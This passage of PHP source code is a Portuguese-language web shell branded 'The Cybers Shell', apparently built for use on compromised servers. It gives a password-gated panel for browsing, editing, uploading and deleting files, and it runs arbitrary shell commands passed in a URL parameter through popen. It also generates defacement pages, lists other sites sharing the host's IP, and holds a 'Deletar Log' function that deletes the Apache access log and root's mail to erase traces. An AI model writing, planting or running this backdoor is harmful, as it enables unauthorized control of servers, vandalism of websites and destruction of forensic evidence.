				Software: "; echo $_SERVER[SERVER_SOFTWARE];echo"<br />
				</small>
			</div>
		</div>
	</div>
	";

	echo "
	<div class='row'>
		<div class='col-12' id='menu'>
		<nav>
			<ul>
				<li><a href='shell.php'>Arquivos</a></li>
				<li><a href='?pag=comandos'>Comandos</a></li>
				<li><a href='?pag=whois'>Whois</a></li>
				<li><a href='?pag=dellog'>Deletar Log</a></li>
				<li><a href='?pag=lookup'>Lookup</a></li>
				<li><a href='?pag=info'>Info</a></li>
			</ul>
		</nav>
		</div>
	</div>
	";

	// Ações POST e GET ==================================================
	// Esta parte irá executar funções de acordo com os parametros passados via get ou post e também chamar as paginas internas do painel

	// Chama função e Renomeia o arquivo
	if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
		renomea_arquivo($renomear, $antigo, $pasta);
	}

	// Chama função que altera o conteúdo de um arquivo, seja para criar ou editar.
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
		echo "Arquivo salvo!";
	}
	if($editar = $_GET['editar']){
		editar($editar);
	}
	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}
	if($upar = $_FILES['upload']){
		upload($upar, $diretorio);
	}
	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
		salvar($criar, "$diretorio/$nome");
		echo "Arquivo criado!";
	}
	if($novo = $_GET['novo']){
		criar($novo);
	}
	if($deface = $_GET['deface']){
		deface($deface);
	}
	if($menu = $_GET['menu']){
		if($menu == "comandos"){
			executar($diretorio);
			exit();
		}
	}

	$page = $_GET['pag'];

	if($page == 'lookup'){
		echo "
			<section>
				<header>Ip Lookup Domain</header>
				<article>
				<center>
					<form action='shell.php' method='get'>
						<input type='hidden' name='pag' value='lookup'></input>
						<label>Dominio ou IP:</label>
						<input type='text' name='host' value='$_GET[host]'></input>
						<input type='submit' value='go'></input>
					</form>
				</center>
				";
				if($host = $_GET['host']){
					reverse($host);
				}
				echo"
				</article>
			</section>
		";
	}

	else if($page == 'comandos'){

		echo "
			<section>
				<header>Comandos</header>
				<article>
				";
				if($cmd = $_GET['cmd']){
					cmd($cmd, $diretorio);
				}
				executar();
				echo"
				</article>
			</section>
		";
	}

	else if($page == 'info'){
		
			echo "
			<section>
				<header>Informações</header>
				<article>
				</article>
			</section>
		";
	}
	else if($page == 'renomear'){
		$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
		renomear($arquivo, $dir);
	}

	else if($page == 'whois'){
		echo "
		<section>
		<header>Whois</header>
		<article>
		";whois();echo"
		</article>
		</section>
		";
	}

	else if($page == 'dellog'){
		echo "
		<section>
		<header>Deletar Log</header>
		<article>
		";dellog();echo"
		</article>
		</section>
		";
	}


	else{
		listar($diretorio);	
	}
	echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam'>The Cybers Team 2016</a></center>";
}


// mostra formulario de login
function login(){
	echo "
	<div id='login'>
		<form method='post'>
			<h2>The Cybers Shell</h2>
			<img src='Logo.png'>
			<label>Senha:</label><br/>
			<input id='senha' type='password' name='senha'>
			<input id='entrar' type='submit' value='Entrar'>
		</form>	
	</div>
	";	
}

// Mostra os dominios que estão no mesmo ip
function reverse($host){
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$host");
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	$json = curl_exec($ch);
	$array = get_object_vars(json_decode($json));
	echo "<center>";
	echo "Total: $array[domainCount]<br />";
	echo "Host: $array[remoteAddress]<br />";
	echo "Ip: $array[remoteIpAddress]<br /><br />";
	echo "</center>";
	echo "<table style='border:0px'>";
	foreach($array[domainArray] as $dominio){
		echo "<tr><td><a target='_blank' href='http://$dominio[0]'>$dominio[0]</a></td></tr>";
	}	
	echo "</table>";
}

// Pega as permissões de arquivos e diretorios
// Mais informações: https://secure.php.net/manual/pt_BR/function.fileperms.php
function permissao($arquivo){
	$perms = fileperms($arquivo);
	if(($perms&0xC000)==0xC000)$info='s';
	elseif(($perms&0xA000)==0xA000)$info='l';
	elseif(($perms&0x8000)==0x8000)$info='-';
	elseif(($perms&0x6000)==0x6000)$info='b';
	elseif(($perms&0x4000)==0x4000)$info='d';
	elseif(($perms&0x2000)==0x2000)$info='c';
	elseif(($perms&0x1000)==0x1000)$info='p';
	else $info='u';
	$info.=($perms&0x0100)?'r':'-';
	$info.=($perms&0x0080)?'w':'-';
	$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
	$info.=($perms&0x0020)?'r':'-';
	$info.=($perms&0x0010)?'w':'-';
	$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
	$info.=($perms&0x0004)?'r':'-';
	$info.=($perms&0x0002)?'w':'-';
	$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
	return $info;
}

// Retorna o caminho do diretorio anterior
function anterior($dir){
	$dir = explode("/",$dir);
	unset($dir[count($dir)-1]);
	if($dir[1] == ""){
		$dir[0] = "/";
	}
	return implode("/",$dir);
}

// Monta tabela para listar todos arquivos do diretorio com as opções de ação
function listar($dir){
	$anterior = anterior($dir);
	echo "
	<div class='row'>
	<div class='col-12'>

		<table>
			<tr style='background-color:#222'>
				<th class='check'><input type=checkbox></input></th>
				<th>Arquivo</th>
				<th>Permissão</th>
				<th>Tamanho</th>
				<th>Ações</th>
			</tr>
	";
	foreach(scandir($dir) as $nome){
		$file = "$dir/$nome";
		if($nome ==".."){
			echo "<tr>";
			echo "<td class='check'></td>";
			echo "<td><a href=?ls=$anterior title='Voltar diretorio'>..</a></td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "</tr>";	
		}
		if(!is_file($file) and $nome != ".." and $nome != "."){
			echo "<tr>";
			echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
			echo "<td><a href=?ls=$file>$nome</a></td>";
			echo "<td>".permissao("$dir/$nome")."</td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "</tr>";
		}
		if($nome != "." && $nome !=".." && is_file($file)){
			echo "<tr>";	
			echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
			echo "<td>".$nome."</td>";
			echo "<td>".permissao("$dir/$nome")."</td>";
			echo "<td>".filesize($file)." bytes</td>";
			echo "<td>
				<a href='?download=$file' title='Baixar'>B</a>
				<a href='?pag=renomear&arquivo=$nome&pasta=$dir' title='Renomear'>R</a>
				<a href='?editar=$file' title='Editar'>E</a>
				<a href='?deletar=$file' title='Deletar'>D</a>
				</td>";
			echo "</tr>";
		}
	}
	echo "</table>
		</div>
	</div>
	<div class='row'>
		<div class='col-4'>
			";acao();echo"
		</div>
		<div class='col-4'>
			";upar($diretorio);echo"
		</div>
	</div>
	";
}

// Função que abre um arquivo para download
function download($arquivo){

    header('Content-Type: application/octet-stream');
    header('Content-Length: '.filesize($arquivo));
    header('Content-Disposition: filename='.$arquivo);
    readfile($arquivo);
    exit();
}

// Mostra formulario html para editar um arquivo
function editar($editar){
	echo "<form action=shell.php method=post>";
	$arq = file($editar);
	echo "<input name=arquivo type=hidden value='$editar'>";
	echo "<textarea name=salvar cols=100 rows=10>";
	foreach($arq as $linha){
		echo htmlspecialchars($linha);
	}
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=salvar>";
	echo "</form>";
	exit();
}

// Mostra formulario html para renomear um arquivo
function renomear($arquivo, $dir){
	echo"
	<section>
		<header>Informações</header>
		<article>
		";
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=pasta type=hidden value='$dir'>";
		echo "<input name=antigo type=hidden value='$arquivo'>";
		echo "<label>Novo nome:</label>";
		echo "<input name=renomear type=text value='$arquivo'>";
		echo "<br />";
		echo "<input type=submit value=renomear>";
		echo "</form>";
		echo"
		</article>
	</section>
	";
	
	exit();
}

// Chama função para renomear arquivo
function renomea_arquivo($novo, $antigo, $dir){
	rename("$dir/$antigo", "$dir/$novo");
	echo "Arquivo renomeado!";
}

// Mostra formulario html para criar um arquivo
function criar($diretorio){
	echo "<form action=shell.php method=post>";
	$arq = file($editar);
	echo "<label>Nome do arquivo:</label><br/>";
	echo "<input type='text' name='nome'/><br/>";
	echo "<input type='hidden' diretorio='$diretorio'/>";
	echo "<label>Conteudo:</label><br/>";
	echo "<textarea name=criar cols=100 rows=10>";
	foreach($arq as $linha){
		echo htmlspecialchars($linha);
	}
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=criar>";
	echo "</form>";
	exit();
}

// Função para criar uma index para deface automatica
function deface($diretorio){
	echo "<form action=shell.php method=post>";
	$arq = file($editar);
	echo "<label>Nome da team:</label><br/>";
	echo "<input type='text' name='nome'/><br/>";

	echo "<label>Greatz:</label><br/>";
	echo "<input type='text' greatz='nome'/><br/>";

	echo "<input type='hidden' diretorio='$diretorio'/>";
	echo "<label>Mensagem:</label><br/>";
	echo "<textarea name=mensagem cols=100 rows=10>";
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=gerar deface>";
	echo "</form>";
	exit();
}

// Função que altera o conteúdo de um arquivo
function salvar($dados, $arquivo){
	$fp = fopen($arquivo, "w");
	fwrite($fp,$dados);
	fclose($fp);
}

// função que remove um arquivo
function deletar($arquivo){
	unlink($arquivo);
	echo "Arquivo deletado!";
}

// Função para ação em massa de todos arquivos e diretorios selecionados
function acao(){
	echo "
	<form>
	<label>Selecionados:</label><br/>
	<select style='width:150px'>
		<option>--</option>
		<option>Deletar</option>
	</select>
	<input type='submit' value='ok'></input>
	</form>
	";
}

// Mostra formulario html para upload de arquivo
function upar($diretorio){
	echo "
	<center>
	<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
		<label>Upload de arquivos:</label><br />
		<input type='file' name='upload'/>
		<input type='hidden' diretorio='$diretorio'/>
		<input id='upar' type='submit' value='Upar!'/>
	</form>
	</center>
	";

}


// Função que faz o upload do arquivo
function upload($arquivo, $diretorio){
	if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
		echo "Upado com sucesso! :D";
	}
}

// Mostra formulario html para alterar o diretorio atual na listagem de arquivos
function navegar($diretorio){
	echo "
	<form class=upar action='shell.php' method='get'>
		<input style='min-width:";echo strlen($diretorio)*10;echo "px' type='text' name='ls' value='$diretorio'/>
		<input type='submit' value='Acessar'/>
	</form>";

}

// Formulario html para executar algum comando no linux
function executar($diretorio){
	echo "
	<form class=upar action='shell.php?' method='get'>
		<input type='hidden' name'diretorio' value='$diretorio'/>
		<input type='hidden' name='pag' value='comandos'/>
		<input style='width:210px' type='text' name='cmd' value=''/>
		<input type='submit' value='Executar'/>
	</form>";

}

// Executa o comando no linux e printa o resultado
function cmd($cmd, $diretorio){
	$p = popen("($cmd)2>&1","r");
	while(!feof($p)){
		echo fgets($p,1000)."<br/>";
	}
}

// Função que exibe um formulario e mostra o whois de um dominio
function whois(){
	echo "
	<form action='shell.php?pag=whois' method='post'>
	Dominio: <input type='text' name='nomedominio'>
	<input type='submit' name='inciarwhois' value='Ir'>
	</form>
	";
	$dominio = $_POST['nomedominio'];
	$nomedominio = $dominio."\r\n";
	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	socket_getpeername($socket, $dominio);
	socket_connect($socket, '200.160.2.3', 43);
	socket_write($socket, $nomedominio, strlen($nomedominio));
	$resultado  = socket_read($socket, 1024);
	echo $resultado;
}

// Função para deletar os logs do linux
function dellog(){
	system("rm -fr /var/log/apache2/access.log");
	system("rm -fr /var/mail/root");
	echo "Log deletado!";
}
?>
</div>
</body>
</html>
